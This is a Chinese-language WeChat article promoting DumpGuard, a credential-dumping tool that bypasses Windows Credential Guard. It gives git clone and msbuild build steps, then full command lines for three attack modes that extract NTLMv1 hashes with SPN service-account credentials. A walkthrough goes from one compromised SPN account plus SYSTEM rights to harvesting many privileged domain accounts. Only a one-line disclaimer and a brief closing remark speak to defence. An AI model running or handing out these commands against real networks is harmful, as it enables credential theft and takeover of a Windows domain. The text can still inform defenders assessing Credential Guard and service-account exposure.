---
title: DumpGuard：首个公开绕过Windows Credential Guard的凭据提取工具
url: https://mp.weixin.qq.com/s/Z0_D7kqGI84Ez3wB4fBzpA
source: Doonsec's feed
date: 2026-01-26
fetch_date: 2026-01-27T03:34:43.845551
---

# DumpGuard：首个公开绕过Windows Credential Guard的凭据提取工具

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/3ibCZqSDX9ujCibhhNV7QZbHlJTuapJlbFkO9Cygd4M8a2ePgbibibleMlib8iavM6jDUR7qichQ7SBF0P4CrJEaP2RFQ/0?wx_fmt=jpeg)

# DumpGuard：首个公开绕过Windows Credential Guard的凭据提取工具

原创

网安武器库
网安武器库

网安武器库

![]()

在小说阅读器中沉浸阅读

**更多干货  点击蓝字 关注我们**

**注：本文仅供学习，坚决反对一切危害网络安全的行为。造成法律后果自行负责！**

**往期回顾**

·[data-cve-poc：近两年的漏洞CVE-POC合集](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486159&idx=1&sn=d4788941d37418ed052eefd317ae631c&scene=21#wechat_redirect)

·[摄像头钓鱼工具--CamPhish](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486137&idx=1&sn=5e7489adeffa7f2b5a61b12836f06795&scene=21#wechat_redirect)

·[CTF利器 PCredz：在流量包中便捷抓取凭据哈希和密码](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486122&idx=1&sn=59edfe2cafe4824c234d199231c45b89&scene=21#wechat_redirect)

·[CF-Hero：尝试发现受Cloudflare CDN保护的网站真实IP](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486083&idx=1&sn=3e78fdcb62e749df78fa8f85fd4ec680&scene=21#wechat_redirect)

·[Yakit：一款集成的强大黑客工具（抓包，中间人劫持，漏洞利用）](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486052&idx=1&sn=c3af88f16854d54bc1aab8269b3acf2a&scene=21#wechat_redirect)

·[在Kali上部署HexStrike Ai：让Ai用kali进行全自动渗透测试和CTF解题](https://mp.weixin.qq.com/s?__biz=MzYzNTExNDYwMg==&mid=2247486029&idx=1&sn=ba0ff37837ecc19bf7add1528fdbc669&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ugSGKJibovaia9YxcaLfMJib6eFcsfYatVNptgRDr3kqeFwpGYKFziaX9s7BBcG8prEJFW1g1EickibFyug/640?wx_fmt=png&from=appmsg)

**介绍**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ujCibhhNV7QZbHlJTuapJlbF5sl27I7IoUYoIY1aBZbJYPf5Z6samUwuxdLx0vuOHtDNw0rre6S2wg/640?wx_fmt=png&from=appmsg)

    DumpGuard 是目前已公开的、能从启用Credential Guard的Windows系统中提取NTLMv1 hash的少数工具之一，主要依赖Remote Credential Guard协议 + SPN账户进行绕过。

    该工具依赖远程凭证保护协议，即使本地主机启用了凭证保护，也允许进行凭证倾倒。您可以从本仓库的发布部分下载预构建副本。

    传统LSASS dump方法在Credential Guard启用后失效，DumpGuard利用 Remote Credential Guard 协议绕过此保护，也就是“伪装”成合法的远程访问请求，骗过系统，实现凭据提取。

    主要绕过/支持场景：

1.Credential Guard 已启用（本地LsaIso.exe保护）

2.受保护的LSASS会话

3.可在无特权上下文提取当前用户NTLMv1 hash（需SPN账户凭据）

4.需要SYSTEM权限才能提取所有会话的凭据

    SPN（Service Principal Name） 是Kerberos身份验证协议中的核心概念，用于在Active Directory域中唯一标识一个服务实例。它不是账户，而是服务在域中的注册标识。

    当客户端需要访问某个服务时（如访问网站、连接数据库、使用文件共享），客户端不是直接联系服务本身，而是先同构域控制器查询SPN注册信息，找到关联的服务账户，并生成相应的安全票据。这确保了服务访问的正确性和安全性。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ugSGKJibovaia9YxcaLfMJib6eFcsfYatVNptgRDr3kqeFwpGYKFziaX9s7BBcG8prEJFW1g1EickibFyug/640?wx_fmt=png&from=appmsg)

**安装介绍**

找到想要放置的目录地址并打开终端，通过克隆的方式从GitHub网站上下载项目：

```
git clone https://github.com/bytewreck/DumpGuard.git
```

    然后就可以在安装好的项目文件中找到.sin结尾的程序。我们点击程序进入Visual Studio中进行编译。

    或者可以从系统中搜索x64 Native Tools Command Prompt for VS 2022进入后，进入到项目文件夹中尽心编译：

```
msbuild DumpGuard.sln /t:Clean # 对之前的编译清除
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9uhukV0zibtzEycicxuXc2XhxIm7A3uG5j1ngCOsuPick3p03Tpic5U66uQjCN39RXjVYSRZ7uql12KgWA/640?wx_fmt=png&from=appmsg)

```
msbuild DumpGuard.sln /p:Configuration=Release /p:Platform=x64 /m
```

    等待系统进行编译，编译成功后：

```
cd ~\DumpGuard\DumpGuard\bin\Releasedir
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9uhukV0zibtzEycicxuXc2XhxInWMhf7unkuWnPxMVXDIVs2zp2BnTfzibBwy5sHc0JXNytYeiaZfkqtDg/640?wx_fmt=png&from=appmsg)

    便可以看到.exe可执行程序已经出现。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ugSGKJibovaia9YxcaLfMJib6eFcsfYatVNptgRDr3kqeFwpGYKFziaX9s7BBcG8prEJFW1g1EickibFyug/640?wx_fmt=png&from=appmsg)

**使用介绍**

DumpGuard主要拥有三大攻击模式：

```
# 模式一：提取当前用户凭据（最常用）# 要求：有效的SPN服务账户凭据，无需特权DumpGuard.exe /mode:self /domain:corp.local /username:svc-sql /password:P@ssw0rd!# 模式二：提取所有用户凭据（最强大）# 要求：SYSTEM权限 + SPN服务账户凭据DumpGuard.exe /mode:all /domain:corp.local /username:svc-iis /password:Password123 /spn:cifs/dc01.corp.local# 模式三：传统提取（兼容模式）# 要求：Credential Guard已禁用，SYSTEM权限DumpGuard.exe /mode:all
```

参数如下：

|  |  |  |
| --- | --- | --- |
| /mode | 运行模式 | self（当前用户）, all（所有用户） |
| /domain | 目标域 | corp.local, ad.company.com |
| /username | SPN账户名 | svc\_mssql, svc\_http |
| /password | SPN账户密码 | ComplexP@ss!2024 |
| /spn | 服务主体名称 | HTTP/web01.corp.local |
| --verbose | 详细输出模式 | （无值） |

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9uhukV0zibtzEycicxuXc2XhxIlvKtfaht6dMC1FklIdA3dnKmIibicXo41SXW7Z3mGOg2M4u2741Eic3hg/640?wx_fmt=png&from=appmsg)

我们模拟一个使用场景，客户担心其服务账户安全性，要求评估SPN账户泄露的影响范围：

SPN账户常具有高权限（数据库访问、文件共享等），当攻击者以某种手段获取到了SPN账户后，首先可以借助工具确认SPN账户可利用性：

```
DumpGuard.exe /mode:self /domain:testcorp.local /username:svc_app /password:"App$rv1c3!" /spn:HTTP/appserver.testcorp.local
# 参数分解：# /mode:self          → "仅提取当前用户凭据"# /domain:testcorp.local → "目标Active Directory域"# /username:svc_app   → "SPN服务账户名称"# /password:"App$rv1c3!" → "服务账户密码（含特殊字符）"# /spn:HTTP/appserver.testcorp.local → "服务主体名称格式"
```

借助上面的参数表格，可以通过语句判断这个SPN账户能否用于绕过Credential Guard，示例的输出如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9uhukV0zibtzEycicxuXc2XhxI68AicNqc0WibCnliaqS8gB5PqyydSL7xH0flEspCb2TvicuWYRRcMYyjGw/640?wx_fmt=png&from=appmsg)

可以判断SPN账户 svc\_app 有效且密码正确，能够绕过Credential Guard保护，可以提取当前用户的NTLMv1哈希，因此可以使用该账户进行攻击。

攻击者获得SYSTEM权限后，使用工具进行权限放大：

```
DumpGuard.exe /mode:all /domain:testcorp.local /username:svc_app /password:"App$rv1c3!" /spn:cifs/dc.testcorp.local
```

最终实现，将SYSTEM权限转换为多个高价值账户凭据，实现从单点访问到全域控制。

在这个示例中，DumpGuard工具达到了以下效果：

1、绕过最强凭证保护：

Windows Credential Guard，利用Remote Credential Guard合法协议，通过SPN账户获得认证令牌，并访问受保护的NtlmCredIsoRemote接口。

2、实现权限爆炸性扩展

    从一个SPN账户出发，最终获得了管理员账户(Administrator)、服务账户(sql\_service, backup\_admin)、特权账户(helpdesk\_01)、普通账户(jdoe)的高权限账户凭据

    同时该工具也有部分限制，仅支持NTLMv1哈希而无法提取NTLMv2、Kerberos票据或明文密码，并且需要提前获取有效的SPN服务账户凭据、必须能连接域控制器进行认证、权限要求/mode:all 需要SYSTEM权限。

    在此案例中，DumpGuard作为权限提升后的关键凭据提取工具，能进一步的扩大攻击范围。

    而在防御角度，DumpGuard作为暴露SPN账户管理弱点的警示器，同时也验证Credential Guard实际防护效果。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ugSGKJibovaia9YxcaLfMJib6eRUtCzBCFbaMYy1c7utlweibCFXWsicmm9ebyvInBtdsD0QRlUDTdLib1g/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ujZsao69o9To7R2EPMICOxibwVeWgBhbMqg4icbbohwQibUQoRcx6ymIwZylKcXjdYCZWgQcibhibzqTyA/0?wx_fmt=png)

网安武器库

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/3ibCZqSDX9ujZsao69o9To7R2EPMICOxibwVeWgBhbMqg4icbbohwQibUQoRcx6ymIwZylKcXjdYCZWgQcibhibzqTyA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过